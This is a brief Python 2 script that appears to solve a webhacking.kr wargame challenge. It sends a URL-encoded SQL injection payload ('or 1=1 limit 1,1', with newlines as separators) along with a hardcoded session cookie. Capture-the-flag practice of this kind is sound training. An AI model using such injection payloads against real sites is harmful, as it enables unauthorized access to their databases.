#-*- coding: utf-8 -*-
import urllib2
import CookieManager

sqlQuery = "1%0aor%0a1=1%0alimit%0a1,1"
challengeUrl = "http://webhacking.kr/challenge/web/web-32/index.php?no=" + sqlQuery
httpRequest = urllib2.Request(challengeUrl)
CookieManager.addCookie("PHPSESSID", "5da1398a14fd19ed8ddcfb5ace4f7ac6")
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
